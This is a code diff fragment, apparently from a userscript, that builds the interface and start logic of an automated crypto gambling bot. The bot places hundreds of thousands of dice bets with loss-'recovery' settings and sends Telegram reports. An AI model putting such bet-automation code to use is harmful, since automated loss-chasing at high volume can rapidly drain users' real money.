+                color: #475569;
+                margin-top: 12px;
+                padding-top: 8px;
+                border-top: 1px solid #334155;
+                font-family: 'Inter', monospace;
+                letter-spacing: 0.3px;
+            }
+            
+            .mode-badge {
+                display: inline-block;
+                padding: 3px 8px;
+                border-radius: 12px;
+                font-size: 9px;
+                font-weight: 600;
+                background: #1e293b;
+                border: 1px solid #f59e0b;
+                color: #f59e0b;
+            }
+            
+            .glow-text {
+                text-shadow: 0 0 10px rgba(245, 158, 11, 0.3);
+            }
+            
+            .info-tip {
+                font-size: 8px;
+                color: #64748b;
+                margin-top: 2px;
+            }
+        `;
+        document.head.appendChild(s);
+        
+        const d = document.createElement("div"); d.id = "orion-wrap";
+        d.innerHTML = `
+            <div class="flex" style="justify-content:space-between; margin-bottom:8px;">
+                <span style="font-size:14px; font-weight:700; color:#f59e0b; text-shadow:0 0 10px rgba(245,158,11,0.3);">⚡ ORION FAST WAGER v3.0</span>
+                <span class="badge" id="st-mode">NORM</span>
+            </div>
+
+            <div class="tab-buttons">
+                <button class="tab-btn active" onclick="switchTab('config')">⚙️ CONFIG</button>
+                <button class="tab-btn" onclick="switchTab('status')">📊 STATUS</button>
+            </div>
+
+            <div id="tab-config" class="tab-content active">
+                <div class="grid-2col">
+                    <div class="input-group">
+                        <label>Currency</label>
+                        <select id="p-currency" style="background:#0f172a;"></select>
+                    </div>
+                    <div class="input-group">
+                        <label>Min Bet</label>
+                        <input id="p-minbet" value="0.00000002">
+                    </div>
+                </div>
+                
+                <div class="grid-2col">
+                    <div class="input-group">
+                        <label>Steps</label>
+                        <input id="p-steps" value="900000">
+                    </div>
+                    <div class="input-group">
+                        <label>Demo Balance</label>
+                        <input id="p-demo-balance" value="100.0">
+                    </div>
+                </div>
+                
+                <div class="grid-2col">
+                    <div class="input-group">
+                        <label>Demo Mode</label>
+                        <div class="switch">
+                            <input type="checkbox" id="p-demo-toggle"> 
+                            <span class="switch-status" id="demo-status">OFF</span>
+                        </div>
+                    </div>
+                    <div class="input-group">
+                        <label>Base Bet</label>
+                        <input id="p-basebet" value="0.00000001" readonly>
+                    </div>
+                </div>
+                
+                <div class="grid-2col">
+                    <div class="input-group">
+                        <label>Margin</label>
+                        <input id="p-margin" value="1.005">
+                    </div>
+                    <div class="input-group">
+                        <label>Target %</label>
+                        <input id="p-target-pct" value="3.0">
+                    </div>
+                </div>
+                
+                <div class="grid-2col">
+                    <div class="input-group">
+                        <label>Stop %</label>
+                        <input id="p-stop-pct" value="20.0">
+                    </div>
+                    <div></div>
+                </div>
+
+                <div class="section">
+                    <div class="section-header" onclick="toggleSection('chance')">
+                        <span class="title">🎯 CHANCE SETTINGS</span>
+                        <span class="collapse-btn" id="collapse-chance">▼</span>
+                    </div>
+                    <div class="section-content" id="content-chance">
+                        <div class="grid-2col">
+                            <div class="input-group">
+                                <label>Normal Min %</label>
+                                <input id="p-ch-min" value="45.0">
+                            </div>
+                            <div class="input-group">
+                                <label>Normal Max %</label>
+                                <input id="p-ch-max" value="55.0">
+                            </div>
+                        </div>
+                        <div class="grid-2col">
+                            <div class="input-group">
+                                <label>Inc Min</label>
+                                <input id="p-ch-inc" value="5.0">
+                            </div>
+                            <div class="input-group">
+                                <label>Inc Max</label>
+                                <input id="p-ch-dec" value="15.0">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="section">
+                    <div class="section-header" onclick="toggleSection('recovery')">
+                        <span class="title">🔄 RECOVERY SMOOTHING</span>
+                        <span class="collapse-btn" id="collapse-recovery">▼</span>
+                    </div>
+                    <div class="section-content" id="content-recovery">
+                        <div style="background:#0f172a; padding:6px; border-radius:8px; margin-bottom:8px; font-size:9px; color:#f59e0b;">
+                            <span>⚡ Smooth recovery to cover losses, not chase profits</span>
+                        </div>
+                        <div class="grid-2col">
+                            <div class="input-group">
+                                <label>Smoothing Factor</label>
+                                <input id="p-recovery-factor" value="0.3" step="0.1" min="0.1" max="1.0">
+                                <div class="info-tip">Higher = faster recovery</div>
+                            </div>
+                            <div class="input-group">
+                                <label>Max Recovery Bets</label>
+                                <input id="p-recovery-max" value="20" step="5" min="5" max="50">
+                                <div class="info-tip">Max bets in recovery</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="section">
+                    <div class="section-header" onclick="toggleSection('trailing')">
+                        <span class="title">📉 TRAILING STOP</span>
+                        <span class="collapse-btn" id="collapse-trailing">▼</span>
+                    </div>
+                    <div class="section-content" id="content-trailing">
+                        <div class="grid-2col">
+                            <div class="input-group">
+                                <label>Min Gap %</label>
+                                <input id="p-trail-min" value="10.0">
+                            </div>
+                            <div class="input-group">
+                                <label>Max Gap %</label>
+                                <input id="p-trail-max" value="20.0">
+                            </div>
+                        </div>
+                        <div class="grid-2col">
+                            <div class="input-group">
+                                <label>Sensitivity</label>
+                                <select id="p-trail-sensitivity">
+                                    <option value="low">Low</option>
+                                    <option value="medium" selected>Medium</option>
+                                    <option value="high">High</option>
+                                </select>
+                            </div>
+                            <div></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="section">
+                    <div class="section-header" onclick="toggleSection('wager')">
+                        <span class="title">🛡️ WAGER SAFETY</span>
+                        <span class="collapse-btn" id="collapse-wager">▼</span>
+                    </div>
+                    <div class="section-content" id="content-wager">
+                        <div class="grid-2col">
+                            <div class="input-group">
+                                <label>Enable Wager</label>
+                                <div class="switch">
+                                    <input type="checkbox" id="p-wager-enable" checked> 
+                                    <span class="switch-status" id="wager-status">ON</span>
+                                </div>
+                            </div>
+                            <div class="input-group">
+                                <label>Wager Chance %</label>
+                                <input id="p-profit-wager-chance" value="99.0">
+                            </div>
+                        </div>
+                        
+                        <div class="sub-title">💰 PROFIT MODE</div>
+                        <div style="background:#0f172a; padding:6px; border-radius:8px; margin-bottom:8px; font-size:9px; color:#f59e0b;">
+                            <span>⚡ Flow: Earn profit first → Then enter wager mode</span>
+                        </div>
+                        <div class="grid-2col">
+                            <div class="input-group">
+                                <label>Enter at (xBase)</label>
+                                <input id="p-profit-trigger-profit" value="100">
+                            </div>
+                            <div class="input-group">
+                                <label>Exit at (xBase)</label>
+                                <input id="p-profit-trigger-loss" value="10">
+                            </div>
+                        </div>
+                        <div class="grid-2col">
+                            <div class="input-group">
+                                <label>Wager Bet %</label>
+                                <input id="p-profit-wager-bet-pct" value="1.5" step="0.01" min="0.01" max="100">
+                            </div>
+                            <div></div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="section">
+                    <div class="section-header" onclick="toggleSection('chart')">
+                        <span class="title">📊 CHART REPORT</span>
+                        <span class="collapse-btn" id="collapse-chart">▼</span>
+                    </div>
+                    <div class="section-content" id="content-chart">
+                        <div style="background:#0f172a; padding:6px; border-radius:8px; margin-bottom:8px; font-size:9px; color:#10b981;">
+                            <span>📈 Auto-send chart every 500 coins wagered</span>
+                        </div>
+                        <div class="grid-2col">
+                            <div class="input-group">
+                                <label>Report Interval</label>
+                                <input id="p-chart-interval" value="500" readonly>
+                                <div class="info-tip">Fixed at 500 coins</div>
+                            </div>
+                            <div></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="tab-status" class="tab-content">
+                <div class="stat-row">
+                    <span>Runtime</span>
+                    <span class="stat-value" id="st-runtime">0h 0m 0s</span>
+                </div>
+                <div class="stat-row">
+                    <span>Balance</span>
+                    <span class="stat-value" id="st-bal">0</span>
+                </div>
+                <div class="stat-row">
+                    <span>Profit</span>
+                    <span class="stat-value" id="st-p" style="color:#10b981">0</span>
+                </div>
+                <div class="stat-row">
+                    <span>Speed</span>
+                    <span class="stat-value" id="st-speed"><span id="st-speed-val">0.00/s</span></span>
+                </div>
+                <div class="stat-row">
+                    <span>Steps</span>
+                    <span class="stat-value" id="st-steps">0/900k</span>
+                </div>
+                <div class="stat-row">
+                    <span>Peak</span>
+                    <span class="stat-value" id="st-peak">0</span>
+                </div>
+                <div class="stat-row">
+                    <span>Gap / Zone / Hits</span>
+                    <span class="stat-value"><span id="st-gap">0.3%</span> | Z<span id="st-zone">1</span> H<span id="st-trail-hits">0</span></span>
+                </div>
+                <div class="stat-row">
+                    <span>Chance (Base→Next)</span>
+                    <span class="stat-value"><span id="st-chance">45%</span>→<span id="st-next">45%</span></span>
+                </div>
+                <div class="stat-row">
+                    <span>Rolls (W/L)</span>
+                    <span class="stat-value" id="st-r">0 (0/0)</span>
+                </div>
+                <div class="stat-row">
+                    <span>Wagered</span>
+                    <span class="stat-value" id="st-wagered">0</span>
+                </div>
+                <div class="stat-row">
+                    <span>Next Chart @</span>
+                    <span class="stat-value" id="st-next-chart">500</span>
+                </div>
+
+                <div class="section" style="margin-top:12px;">
+                    <div class="section-header" onclick="toggleSection('logs')">
+                        <span class="title">📝 LIVE LOGS</span>
+                        <span class="collapse-btn" id="collapse-logs">▼</span>
+                    </div>
+                    <div class="section-content" id="content-logs">
+                        <div style="font-size:9px; color:#64748b; margin-bottom:4px; font-family: monospace; display: grid; grid-template-columns: 1fr 1fr 1fr;">
+                            <span>Amount</span>
+                            <span style="text-align:center;">Chance</span>
+                            <span style="text-align:right;">Profit</span>
+                        </div>
+                        <div id="p-logs">
+                            <div style="color:#475569; text-align:center;">Ready</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="st-user">User: Syncing...</div>
+
+            <div class="grid-2col" style="gap:8px; margin-top:8px;">
+                <button id="p-start" class="btn btn-primary">▶ START</button>
+                <button id="p-stop" class="btn btn-danger" disabled>⏹ STOP</button>
+            </div>
+            
+            <div class="footer-copyright">
+                © 2025 ORION LOGIC — All rights reserved.
+            </div>
+        `;
+        document.body.appendChild(d);
+
+        window.switchTab = function(tabName) {
+            document.querySelectorAll('.tab-btn').forEach(function(btn) {
+                btn.classList.remove('active');
+            });
+            document.querySelectorAll('.tab-content').forEach(function(content) {
+                content.classList.remove('active');
+            });
+            
+            event.target.classList.add('active');
+            document.getElementById('tab-' + tabName).classList.add('active');
+        };
+
+        window.toggleSection = function(sectionId) {
+            const content = document.getElementById('content-' + sectionId);
+            const btn = document.getElementById('collapse-' + sectionId);
+            if (content && btn) {
+                content.classList.toggle('collapsed');
+                btn.classList.toggle('collapsed');
+                btn.innerHTML = content.classList.contains('collapsed') ? '►' : '▼';
+            }
+        };
+
+        document.getElementById("p-wager-enable").onchange = function(e) {
+            bot.isWagerEnabled = e.target.checked;
+            const statusEl = document.getElementById("wager-status");
+            if (statusEl) {
+                statusEl.innerText = e.target.checked ? "ON" : "OFF";
+                statusEl.className = "switch-status " + (e.target.checked ? "on" : "off");
+            }
+            if (!bot.isWagerEnabled && bot.isWagerMode) {
+                bot.isWagerMode = false;
+                if (!bot.isMinesMode) {
+                    bot.baseChance = bot.normalChance;
+                }
+                updateModeDisplay();
+            }
+        };
+
+        document.getElementById("p-demo-toggle").onchange = function(e) {
+            bot.isDemo = e.target.checked;
+            const statusEl = document.getElementById("demo-status");
+            if (statusEl) {
+                statusEl.innerText = e.target.checked ? "ON" : "OFF";
+                statusEl.className = "switch-status " + (e.target.checked ? "on" : "off");
+            }
+            updateModeDisplay();
+        };
+
+        document.getElementById("p-steps").addEventListener("input", function() {
+            if (bot.stats.startBal > 0 && bot.baseChance > 0 && !bot.isRunning) updateBaseBetFromSteps();
+        });
+
+        document.getElementById("p-target-pct").addEventListener("input", function() {
+            if (bot.stats.startBal > 0 && bot.baseChance > 0 && !bot.isRunning) updateBaseBetFromSteps();
+        });
+
+        document.getElementById("p-currency").onchange = function(e) {
+            bot.selectedCurrency = e.target.value;
+        };
+
+        document.getElementById("p-start").onclick = async function() {
+            bot.selectedCurrency = document.getElementById("p-currency").value;
+            if (!bot.isDemo) await API.syncOnce();
+            
+            bot.isRunning = true;
+            bot.lastTelegramTime = Date.now();
+            bot.lastBetTime = 0;
+            document.getElementById("p-start").disabled = true;
+            document.getElementById("p-stop").disabled = false;
+            
+            bot.stats = { profit: 0, wagered: 0, startBal: 0, currentBal: 0, bets: 0, wins: 0, loss: 0, startTime: Date.now(), maxDD: 0, maxDDPerc: 0, history: [] };
+            
+            if (!bot.isDemo) bot.stats.startBal = await API.getBalance(bot.selectedCurrency);
+            else bot.stats.startBal = parseFloat(document.getElementById("p-demo-balance")?.value) || 100.0;
+
+            bot.stats.currentBal = bot.stats.startBal;
+            bot.stats.history = [bot.stats.startBal];
+            bot.maxSteps = parseInt(document.getElementById("p-steps")?.value) || 900000;
+            bot.currentSteps = 0;
+            bot.stepsResetCount = 0;
+            bot.isMinesMode = false;
+            bot.isWagerMode = false;
+            bot.recoveryMode = false;
+            bot.lastChartWagerAmount = 0;
+            
+            bot.mines.totalBets = 0;
+            bot.mines.totalWagered = 0;
+            bot.mines.totalProfit = 0;
+            bot.mines.globalMaxPayout = 0;
+            
+            bot.chartReportInterval = 500;
+            
+            bot.isWagerEnabled = document.getElementById("p-wager-enable").checked;
+            
+            bot.profitTriggerProfit = parseFloat(document.getElementById("p-profit-trigger-profit")?.value) || 100;
+            bot.profitTriggerLoss = parseFloat(document.getElementById("p-profit-trigger-loss")?.value) || 10;
+            bot.profitWagerChance = parseFloat(document.getElementById("p-profit-wager-chance")?.value) || 99.0;
+            bot.profitWagerBetPct = parseFloat(document.getElementById("p-profit-wager-bet-pct")?.value) || 1.5;
+            
+            bot.minesLimit = parseFloat(document.getElementById("p-mines-limit")?.value) || 3.0;
+            bot.minesMaxBets = parseInt(document.getElementById("p-mines-max-bets")?.value) || 5;
+            bot.minesMinesCount = parseInt(document.getElementById("p-mines-count")?.value) || 13;
+            
+            initTrailing();
+            
+            const targetPct = parseFloat(document.getElementById("p-target-pct")?.value) || 3.0;
+            bot.targetAbs = bot.stats.startBal * (targetPct / 100);
+            bot.stopLossAbs = bot.stats.startBal * (parseFloat(document.getElementById("p-stop-pct")?.value) / 100);
+            
+            setNewBaseChance();
+            
+            bot.perStep = bot.targetAbs / bot.maxSteps;
+            
+            const baseBetInput = document.getElementById("p-basebet");
+            if (baseBetInput && baseBetInput.value) {
+                bot.perStep = parseFloat(baseBetInput.value) * (99 / bot.baseChance);
+            }
+            
+            updateModeDisplay();
+            
+            await API.sendTelegramReport();
+            runLoop();
+        };
+
+        document.getElementById("p-stop").onclick = async function() { 
+            bot.isRunning = false; 
+            bot.isMinesMode = false;
+            document.getElementById("p-start").disabled = false;
+            document.getElementById("p-stop").disabled = true;
+            await API.sendTelegramReport();
+        };
+
+        setInterval(function() {
+            if (!document.getElementById("st-p")) return;
+            document.getElementById("st-p").innerText = bot.stats.profit.toFixed(8);
+            document.getElementById("st-bal").innerText = bot.stats.currentBal.toFixed(8) + " " + bot.selectedCurrency.toUpperCase();
+            document.getElementById("st-r").innerText = bot.stats.bets + ' (' + bot.stats.wins + '/' + bot.stats.loss + ')';
+            document.getElementById("st-wagered").innerText = bot.stats.wagered.toFixed(8);
+            
+            const nextChart = (Math.floor(bot.stats.wagered / bot.chartReportInterval) + 1) * bot.chartReportInterval;
+            document.getElementById("st-next-chart").innerText = nextChart.toFixed(0);
+            
+            updateDisplay();
+        }, 500);
+    }
+
+    createUI();
+    initMinesUI();
+    API.syncOnce();
+})();
